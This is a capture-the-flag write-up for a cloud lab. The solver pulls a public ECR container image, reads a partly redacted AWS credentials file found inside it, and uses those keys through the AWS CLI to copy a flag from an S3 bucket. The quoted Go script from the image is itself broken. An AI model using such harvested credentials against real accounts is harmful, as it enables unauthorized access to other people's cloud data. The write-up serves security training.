# Challenge 4
---
We are back with another challenge of the week. Our Security team discovered a public ECR Repository during their assessment. They decided to share the information with everyone 😛 and now need your help to get flag.

“We found that a ECR Repository called **challenge-4** which belongs to **securitylabs** registry. called We suspect some serious security lapse. Help us prove this to their team”

You can DM us the flag at [@securitylabs_](http://twitter.com/securitylabs_) to verify it. We might have some surprise for you!

_For more such interesting labs and content register for beta at [https://securitylabs.tech](https://securitylabs.tech/)_

Have fun hacking cloud with SecurityLabs 🙂


---


## Solution

**Find the ECR image**

So you are supposed to be able query ECR public to find images, ie aws ecr-public describe-images --repository-name securitylabs
However this kept giving me errors.
An easier solution is just to go the public ecr gallery and search there https://gallery.ecr.aws/
https://gallery.ecr.aws/securitylabs/challenge-4

**Explore image**

Now we have the image location we can pull it, it'd probably be wise to do this in an isolated VM given the ease of backdooring containers.

```
docker pull public.ecr.aws/securitylabs/challenge-4:latest
# Now to jump in with a shell
docker run -it public.ecr.aws/securitylabs/challenge-4  sh
```

In the root folder is the following script

```
# cat app.go
import "github.com/aws/aws-sdk-go/service/s3"
import "os"
import (
        "github.com/aws/aws-sdk-go/aws/session"
        "github.com/aws/aws-sdk-go/service/s3"
        "github.com/aws/aws-sdk-go/service/s3/s3manager"
        "fmt"
)

func main(){
        bucket := "aws-bucket-sl"
        file := "flag.txt"

        sess, _ := session.NewSession(&aws.Config{
                Region: aws.String("us-west-2")},
        )

        downloader := s3manager.NewDownloader(sess)

        file, err := os.Create("op.txt")
        numBytes, err := downloader.Download(file,
            &s3.GetObjectInput{
                Bucket: aws.String(bucket),
                Key:    aws.String(item),
        })

        fmt.Println("Downloaded", file.Name(), numBytes, "bytes")
}
```

We also find AWS creds
```
# cat *
[default]
region = us-east-2
output = json
[default]
aws_access_key_id = AKIA<redacted>NT
aws_secret_access_key = dMSY6<redacted>Zm1
#
```
Configure and get the flag

```
aws configure --profile cloudchall set aws_secret_access_key dMSY6<redacted>Zm1
aws configure --profile cloudchall set aws_access_key_id AKIA<redacted>NT
aws configure --profile cloudchall set region us-east-2

aws sts get-caller-identity --profile cloudchall

{

 "UserId": "AIDAYQDT3AH7QT2W4JAIM",

 "Account": "584358494719",

 "Arn": "arn:aws:iam::584358494719:user/challenge-4"

}

aws s3 cp s3://aws-bucket-sl/flag.txt . --region us-west-2 --profile cloudchall

cat flag.txt
```
